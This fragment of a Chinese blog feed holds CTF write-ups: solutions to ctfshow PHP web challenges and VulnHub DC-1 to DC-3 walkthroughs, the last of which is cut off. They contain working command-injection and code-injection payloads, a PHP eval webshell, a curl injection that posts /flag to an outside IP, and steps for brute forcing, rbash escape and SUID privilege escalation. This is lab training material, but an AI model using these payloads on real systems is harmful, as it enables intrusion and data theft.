        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>ctfshow大赛原题</title>
    <url>/2023/07/13/ctfshow%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/</url>
    <content><![CDATA[ <span id="more"></span>

<h2 id="680"><a href="#680" class="headerlink" title="680"></a>680</h2><p>disable_function绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=var_dump(scandir(&quot;.&quot;));</span><br></pre></td></tr></table></figure>

<p>然后访问<strong>secret_you_never_know</strong>，然后下载便是flag</p>
<h2 id="681"><a href="#681" class="headerlink" title="681"></a>681</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://79b263f7-6ba8-4456-9907-38d11f112131.challenge.ctf.show/check.php</span><br></pre></td></tr></table></figure>

<p>name&#x3D;||1#\</p>
<h2 id="683"><a href="#683" class="headerlink" title="683"></a>683</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">if(isset($_GET[&#x27;秀&#x27;]))&#123;</span><br><span class="line">    if(!is_numeric($_GET[&#x27;秀&#x27;]))&#123;</span><br><span class="line">       die(&#x27;必须是数字&#x27;);</span><br><span class="line">    &#125;else if($_GET[&#x27;秀&#x27;] &lt; 60 * 60 * 24 * 30 * 2)&#123;</span><br><span class="line">       die(&#x27;你太短了&#x27;);</span><br><span class="line">    &#125;else if($_GET[&#x27;秀&#x27;] &gt; 60 * 60 * 24 * 30 * 3)&#123;</span><br><span class="line">        die(&#x27;你太长了&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        sleep((int)$_GET[&#x27;秀&#x27;]);</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep((int)$_GET[&#x27;秀&#x27;]);</span><br><span class="line">可以用16进制绕，会被强转成 0</span><br><span class="line">0x755000</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?秀=0x76a699</span><br></pre></td></tr></table></figure>

<h2 id="684"><a href="#684" class="headerlink" title="684"></a>684</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&#x27;action&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">$arg = $_GET[&#x27;arg&#x27;] ?? &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&#x27;&#x27;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先过滤ctfshow 不能是字母数字下划线</span><br><span class="line"></span><br><span class="line">在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，</span><br><span class="line">调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。</span><br><span class="line">如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</span><br><span class="line"></span><br><span class="line">create_function(&#x27;$a&#x27;,&#x27;return 111&#x27;)</span><br><span class="line">等价于</span><br><span class="line">function a($a)&#123;</span><br><span class="line">    return 111;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">create_function(&#x27;$a&#x27;,&#x27;return 111;&#125;phpinfo();//&#x27;）</span><br><span class="line">等价于</span><br><span class="line">function a($a)&#123;</span><br><span class="line">    return 111;&#125;phpinfo();//</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">总结payload，%5c 是\ </span><br><span class="line">?action=%5ccreate_function&amp;arg=&#125;system(&quot;cat /secret_you_never_know&quot;);//</span><br></pre></td></tr></table></figure>

<h2 id="685"><a href="#685" class="headerlink" title="685"></a>685</h2><h2 id="686"><a href="#686" class="headerlink" title="686"></a>686</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;    </span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方法一</p>
<p>getallheaders()</p>
<p>这个函数的作用就是返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=system(pos(getallheaders()));</span><br><span class="line">getallheaders() 获取请求头信息</span><br><span class="line">pos() 返回数组中的当前元素的值（一般就是第一个了）</span><br><span class="line">end() 返回最后一个</span><br></pre></td></tr></table></figure>

<p>方法二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=system(end(pos(get_defined_vars())));&amp;shell=cat%20/secret_you_never_know</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_defined_vars() 函数返回由所有已定义变量所组成的数组</span><br></pre></td></tr></table></figure>

<h2 id="687"><a href="#687" class="headerlink" title="687"></a>687</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$target</span>);</span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;|&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 1 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>%0a绕过过滤管道符</p>
<p>paylaoad:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=1%0acat%20/f*%0a</span><br></pre></td></tr></table></figure>

<h2 id="688"><a href="#688" class="headerlink" title="688"></a>688</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === <span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===<span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">    <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$url</span>=<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://101.43.182.125:5000/&#x27; -F file=@/flag &#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://php.golaravel.com/install.pecl.windows.html">PECL 扩展库安装 « PHP Manual | PHP 中文手册 (golaravel.com)</a></p>
<p><a href="https://pecl.php.net/package/mcrypt/1.0.4/windows">PECL ：： 软件包 ：： mcrypt 1.0.4 for Windows (php.net)</a></p>
<p>然后直接运行即可</p>
<h2 id="689"><a href="#689" class="headerlink" title="689"></a>689</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$path</span> = <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$path</span>,<span class="string">&#x27;..&#x27;</span>) &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;This is a waf!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>,<span class="string">&#x27;http://127.0.0.1/&#x27;</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;console.log(<span class="subst">$path</span> update successed!)&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello.CTFshow&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题有点绕</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET) &amp;&amp; !empty($_GET))&#123;</span><br><span class="line">    $url = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $path = &quot;upload/&quot;.$_GET[&#x27;path&#x27;];</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">echo $url;</span><br></pre></td></tr></table></figure>

<p>本地搭建 url 的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/?file=http://127.0.0.1/&amp;path=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p>path的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload/2.php</span><br></pre></td></tr></table></figure>

<p>所以写入的是2.php 但是通过file_get_content,改变了数值变成了新的path</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://127.0.0.1/?file=http://127.0.0.1/%26path=&lt;?php eval($_POST[1]);?&gt;&amp;path=2.php</span><br></pre></td></tr></table></figure>

<h2 id="690未写"><a href="#690未写" class="headerlink" title="690未写"></a>690未写</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$args</span>); <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\w+$/&#x27;</span>, <span class="variable">$args</span>[<span class="variable">$i</span>]) )</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;sorry&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;./ &#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$args</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;Hello&#x27;</span>,<span class="string">&#x27;World!&#x27;</span>,<span class="string">&#x27;Beautiful&#x27;</span>,<span class="string">&#x27;Day!&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot; &quot;</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#Hello World! Beautiful Day!</span></span><br></pre></td></tr></table></figure>

<p>implode() 函数返回一个由数组元素组合成的字符串。</p>
<p><a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">IP地址进制转换 (520101.com)</a></p>
<h2 id="691"><a href="#691" class="headerlink" title="691"></a>691</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;inc.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span>   <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">      <span class="variable">$filterlist</span> = <span class="string">&quot;/\(|\)|username|password|where|</span></span><br><span class="line"><span class="string">      case|when|like|regexp|into|limit|=|for|;/&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filterlist</span>,<span class="title function_ invoke__">strtolower</span>(<span class="variable">$str</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;illegal input!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])?</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]):<span class="keyword">die</span>(<span class="string">&quot;please input username!&quot;</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])?</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]):<span class="keyword">die</span>(<span class="string">&quot;please input password!&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from admin where  username =</span></span><br><span class="line"><span class="string"> &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27; &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$conn</span> -&gt; <span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="variable">$row</span> = <span class="variable">$res</span> -&gt; <span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;The content in the password column is the flag!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="692未写"><a href="#692未写" class="headerlink" title="692未写"></a>692未写</h2><h2 id="693"><a href="#693" class="headerlink" title="693"></a>693</h2><h2 id="695"><a href="#695" class="headerlink" title="695"></a>695</h2><h2 id="800"><a href="#800" class="headerlink" title="800"></a>800</h2>]]></content>
  </entry>
  <entry>
    <title>dc系列</title>
    <url>/2023/06/25/dc%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<p> dc系列</p>
<span id="more"></span>

<h2 id="dc-1"><a href="#dc-1" class="headerlink" title="dc-1"></a>dc-1</h2><p>靶机安装</p>
<p>打开网址发现drupal,直接用之前的脚本打就行，</p>
<p>但是这里列出第二个方法，直接用msf好像更省事</p>
<p>进入msf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625201250.png"></p>
<p>这里用第一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 1</span><br></pre></td></tr></table></figure>

<p>设置一下目标 ，run,进入shell</p>
<p>cat flag1.txt<br>Every good CMS needs a config file - and so do you.</p>
<p>这是第一个flag,并提醒看f配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www/sites/default$ cat settings.php</span><br></pre></td></tr></table></figure>

<p>内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">$databases = array (</span><br><span class="line">  &#x27;default&#x27; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>这个是第二个flag，并获得数据库的账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u dbuser -p</span><br><span class="line">R0ck3t</span><br><span class="line">use drupaldb;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>

<p>发现数据库被加密，而且不像是md5 加密，flag2 提示不是暴力破解，所以找到加密方式即可。</p>
<p>在scripts 下有加密脚本password-hash.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625210716.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$S$D/6o8k.0p794/LgicJmM5ZiuL5KYzyWUa7KBeACEHloSB/aio0By</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set pass=&#x27;$S$D/6o8k.0p794/LgicJmM5ZiuL5KYzyWUa7KBeACEHloSB/aio0By&#x27; where name=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>

<p>然后登录,在content拿到flag3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br></pre></td></tr></table></figure>

<p>接下来提权，发现msf 没有啥提权建议，</p>
<p>第四个flag 在 &#x2F;home&#x2F;flag4&#x2F;flagg4.txt</p>
<p>Can you use this same method to find or access the flag in root?</p>
<p>suid 提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625213554.png"></p>
<p> 发现find,</p>
<h3 id="suid-find-提权"><a href="#suid-find-提权" class="headerlink" title="suid find 提权"></a>suid find 提权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir test</span><br><span class="line">find test -exec &#x27;/bin/sh&#x27; \;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625221245.png"></p>
<p>最后的flag </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Well done!!!!</span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>

<h2 id="dc-2"><a href="#dc-2" class="headerlink" title="dc-2"></a>dc-2</h2><p>下载地址<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p>
<p>安装扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.0/24 -sn</span><br><span class="line">nmap -sV -A -p- 192.168.158.162</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230630171454.png"></p>
<p>访问，发现访问不了 ，寄了，看师傅的wp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure>

<p>编辑 hosts,添加如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.158.162 dc-2</span><br></pre></td></tr></table></figure>

<p>然后访问成功，访问,可以看到第一个flag</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230630171316.png"></p>
<p>提示使用cewl,一个生成字典的工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2 -w passwd.txt</span><br></pre></td></tr></table></figure>

<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --ignore-main-redirect --url http://dc-2 --enumerate u --force</span><br></pre></td></tr></table></figure>

<p>存在三个用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin tom jerry</span><br></pre></td></tr></table></figure>

<p>有密码，有字典，爆破一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U users.txt -P passwd.txt</span><br></pre></td></tr></table></figure>

<p>爆破结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jerry / adipiscing                                                                       </span><br><span class="line">tom / parturient  </span><br></pre></td></tr></table></figure>

<p>登录，提示后台拿不到shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>

<p>发现cat nl 等命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compgen -c       //查看可以使用的指令</span><br></pre></td></tr></table></figure>

<p>vi flag*</p>
<p>flag3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">oor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/qq_43168364/article/details/111830233">(5条消息) 【渗透测试】— rbash逃逸方法简述_rbash 命令_通地塔的博客-CSDN博客</a></p>
<h3 id="rbash逃逸绕过"><a href="#rbash逃逸绕过" class="headerlink" title="rbash逃逸绕过"></a>rbash逃逸绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//新建一个文件，末行命令，回车</span><br><span class="line">vi test</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line">//设置环境变量</span><br><span class="line">vi test</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure>

<p>之后就能正常命令执行了,cd 到jerry ,第四个flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#x27;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>



<p>sudo -l 发现提示</p>
<p>可以用git 提权</p>
<h3 id="suid-git-提权"><a href="#suid-git-提权" class="headerlink" title="suid git 提权"></a>suid git 提权</h3><p><strong>(我们需要将shell的窗口变窄,使得回显信息不能一页显示)重点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo git help config #然后会出现:输入框，回显信息不能一页显示才有</span><br><span class="line">然后输入</span><br><span class="line">!/bin/bash 或 !&#x27;sh&#x27; #完成提权</span><br></pre></td></tr></table></figure>

<p>最后的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Congratulatons!!!</span><br><span class="line"></span><br><span class="line">A special thanks to all those who sent me tweets</span><br><span class="line">and provided me with feedback - it&#x27;s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>

<h2 id="dc-3"><a href="#dc-3" class="headerlink" title="dc-3"></a>dc-3</h2><p>wappalyzer 扫描一下</p>
<p>发现joomla php框架</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">doomlscan -u http://192.168.158.160</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708163601.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br><span class="line">searchsploit -p 42033.txt</span><br><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br></pre></td></tr></table></figure>



